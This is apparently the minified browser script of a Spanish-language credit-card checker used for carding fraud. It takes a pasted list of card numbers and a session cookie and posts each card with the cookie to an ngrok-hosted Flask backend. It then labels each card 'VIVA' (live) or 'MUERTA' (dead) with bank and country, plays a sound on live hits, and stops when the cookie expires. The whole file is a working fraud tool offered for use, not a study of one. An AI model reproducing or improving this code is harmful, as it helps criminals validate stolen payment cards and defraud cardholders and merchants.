let _audioCtx,_lastBeep=0;function _ctx(){return _audioCtx||(_audioCtx=new(window.AudioContext||window.webkitAudioContext)),_audioCtx}function _beep({freq:e=440,dur:t=.12,type:n="sine",vol:o=.15}){const s=_ctx().currentTime;if(!(s-_lastBeep<.05)){_lastBeep=s;const i=_ctx().createOscillator(),r=_ctx().createGain();i.type=n,i.frequency.setValueAtTime(e,s),r.gain.setValueAtTime(o,s),r.gain.exponentialRampToValueAtTime(1e-4,s+t),i.connect(r),r.connect(_ctx().destination),i.start(s),i.stop(s+t)}}function playLiveSound(){_beep({freq:880,dur:.09,type:"sine",vol:.18}),setTimeout(()=>_beep({freq:1046,dur:.11,type:"sine",vol:.18}),110)}function playErrorSound(){_beep({freq:220,dur:.18,type:"square",vol:.16})}const FLASK_URL="https://doughtier-merilyn-catamenial.ngrok-free.dev";let ccList=[],running=!1,paused=!1,currentIndex=0;const results={TOTAL:0,TESTED:0,VIVA:0,MUERTA:0,ERROR:0,COOKIE_EXPIRADA:0,logs:[]};let currentFilter="all";const cookieArea=document.getElementById("cookie-area"),ccListArea=document.getElementById("cc-list-area"),startBtn=document.getElementById("start-btn"),pauseBtn=document.getElementById("pause-btn"),stopBtn=document.getElementById("stop-btn"),clearBtn=document.getElementById("clear-btn"),statusDisplay=document.getElementById("checker-status"),logContainer=document.getElementById("log-container"),logFilterTitle=document.getElementById("log-filter-title"),creditBadge=document.getElementById("credit-badge"),logoutBtn=document.querySelector(".btn.logout"),recDot=statusDisplay?statusDisplay.querySelector(".rec"):null,resultsSection=document.getElementById("results-section"),formSection=document.getElementById("form-section");function updateStatus(e,t=!1){if(statusDisplay){statusDisplay.innerHTML=`<span class="rec ${t?"active":""}"></span> ${e}`;const n=statusDisplay.querySelector(".rec");n&&n.classList.toggle("active",t)}}function updateStats(){const e=e=>document.getElementById(e),t=(t,n)=>{const o=e(t);o&&(o.textContent=n)};t("count-VIVA",results.VIVA),t("count-MUERTA",results.MUERTA),t("count-ERROR",results.ERROR+results.COOKIE_EXPIRADA),t("count-TESTED",results.TESTED),t("count-TOTAL",results.TOTAL),t("icon-count-TOTAL",results.TOTAL),t("icon-count-VIVA",results.VIVA),t("icon-count-MUERTA",results.MUERTA),t("icon-count-ERROR",results.ERROR+results.COOKIE_EXPIRADA)}function loadCredits(){creditBadge&&(creditBadge.innerHTML='<span class="dot"></span> Sesi√≥n activa - <b>30 CR√âDITOS</b>')}function updateLogDisplay(){if(!resultsSection||!formSection)return;if("all"===currentFilter)resultsSection.style.display="none",formSection.style.display="block";else{resultsSection.style.display="block",formSection.style.display="none"}logContainer&&(logContainer.innerHTML="");let e=results.logs;"all"!==currentFilter&&(e="ERROR"===currentFilter?results.logs.filter(e=>"ERROR"===e.estado||"COOKIE_EXPIRADA"===e.estado||"DESCONOCIDO"===e.estado):results.logs.filter(e=>e.estado===currentFilter)),logFilterTitle&&(logFilterTitle.textContent="all"===currentFilter?"Todas":currentFilter),e.slice().reverse().forEach(e=>{const t=document.createElement("div");let n=e.estado,o=e.estado;"COOKIE_EXPIRADA"===e.estado?(n="ERROR",o="üç™ EXPIRADA"):"DESCONOCIDO"===e.estado?(n="ERROR",o="‚ö†Ô∏è DESCONOCIDO"):"VIVA"===e.estado?o="‚úÖ VIVA":"MUERTA"===e.estado&&(o="‚ùå MUERTA");const s={VIVA:"VIVA",MUERTA:"MUERTA",ERROR:"ERROR",COOKIE_EXPIRADA:"ERROR",DESCONOCIDO:"ERROR"};t.className="log-item",t.innerHTML=`\n            <div class="log-cc">\n                ${e.cc}\n                <span class="log-result result-${s[n]}">${o}</span>\n            </div>\n        `,logContainer&&logContainer.appendChild(t)})}function formatCard(e){return e.replace(/[^0-9|]/g,"").trim()}async function checkCard(e){const t=cookieArea?cookieArea.value.trim():"",n=formatCard(e);if(!t||!n)return"ERROR";try{const e=await fetch(`${FLASK_URL}/check_cc`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cc:n,cookie:t})}),o=await e.json();return"COOKIE_EXPIRADA"===o.estado?(results.logs.push({estado:"COOKIE_EXPIRADA",cc:n,banco:"N/A",pais:"N/A",flag:"üç™",raw:o.mensaje}),playErrorSound(),"COOKIE_EXPIRADA"):e.ok&&"ERROR"!==o.estado&&"DESCONOCIDO"!==o.estado?(results.logs.push({estado:o.estado,cc:n,banco:o.banco||"N/A",pais:o.pais||"N/A",flag:o.flag||"",raw:o.raw||"N/A"}),"VIVA"===o.estado&&playLiveSound(),o.estado):(results.logs.push({estado:"ERROR"===o.estado?"ERROR":"DESCONOCIDO",cc:n,banco:"N/A",pais:"N/A",flag:"‚ùå",raw:o.mensaje||`Error HTTP: ${e.status}`}),playErrorSound(),"ERROR")}catch(e){return console.error("Error al chequear tarjeta (Fallo de red/CORS):",e),results.logs.push({estado:"ERROR",cc:n,banco:"N/A",pais:"N/A",flag:"üåê",raw:"Error de conexi√≥n con el backend Flask."}),playErrorSound(),"ERROR"}}async function startChecking(){if(running)return;if(ccList=ccListArea?ccListArea.value.split("\n").map(e=>e.trim()).filter(e=>e.length>0):[],results.TOTAL=ccList.length,0===results.TOTAL)return void updateStatus("ERROR: No hay tarjetas en la lista.",!1);for(running=!0,paused=!1,currentIndex=results.TESTED,startBtn&&(startBtn.disabled=!0),pauseBtn&&(pauseBtn.disabled=!1),stopBtn&&(stopBtn.disabled=!1),updateStatus(`Iniciando chequeo... Tarjetas: ${results.TOTAL}`,!0);currentIndex<ccList.length&&!(!running||paused);currentIndex++){const e=ccList[currentIndex];await new Promise(e=>setTimeout(e,150)),updateStatus(`Chequeando ${currentIndex+1}/${results.TOTAL}: ${e.substring(0,6)}...`,!0);const t=await checkCard(e);results.TESTED++,"VIVA"===t?results.VIVA++:"MUERTA"===t?results.MUERTA++:"COOKIE_EXPIRADA"===t?(results.COOKIE_EXPIRADA++,updateStatus("COOKIE EXPIRADA. Proceso detenido.",!1),running=!1,paused=!1,console.log("Proceso detenido por cookie expirada"),currentIndex=ccList.length):results.ERROR++,updateStats(),updateLogDisplay()}running&&updateStatus("Chequeo finalizado.",!1),paused?(updateStatus(`PAUSADO. Index: ${currentIndex+1}/${ccList.length}`,!1)):(running=!1,startBtn&&(startBtn.disabled=!1),pauseBtn&&(pauseBtn.disabled=!0),stopBtn&&(stopBtn.disabled=!0))}document.addEventListener("DOMContentLoaded",()=>{loadCredits(),updateStats(),updateStatus("Detenido. Esperando lista y cookie.",!1),updateLogDisplay(),startBtn&&startBtn.addEventListener("click",()=>{paused=!1,startChecking()}),pauseBtn&&pauseBtn.addEventListener("click",()=>{running&&(running=!1,paused=!0,updateStatus(`PAUSADO. Index: ${currentIndex+1}/${ccList.length}`,!1),startBtn&&(startBtn.disabled=!1),pauseBtn&&(pauseBtn.disabled=!0),stopBtn&&(stopBtn.disabled=!1))}),stopBtn&&stopBtn.addEventListener("click",()=>{running=!1,paused=!1,currentIndex=0,updateStatus("PARADO. Presione INICIAR para comenzar de nuevo.",!1),startBtn&&(startBtn.disabled=!1),pauseBtn&&(pauseBtn.disabled=!0),stopBtn&&(stopBtn.disabled=!0)}),clearBtn&&clearBtn.addEventListener("click",()=>{if(running)return;Object.keys(results).forEach(e=>{"number"==typeof results[e]&&(results[e]=0)}),results.logs=[],ccListArea&&(ccListArea.value=""),currentIndex=0,updateStats(),updateLogDisplay(),updateStatus("Detenido. Listas y resultados limpiados.",!1)}),logoutBtn&&logoutBtn.addEventListener("click",()=>{alert("Sesi√≥n cerrada (simulaci√≥n).")}),document.querySelectorAll(".iconbar .icon").forEach(e=>{e.addEventListener("click",function(){document.querySelectorAll(".iconbar .icon").forEach(e=>e.classList.remove("active")),this.classList.add("active"),currentFilter=this.getAttribute("data-filter"),updateLogDisplay()})})});
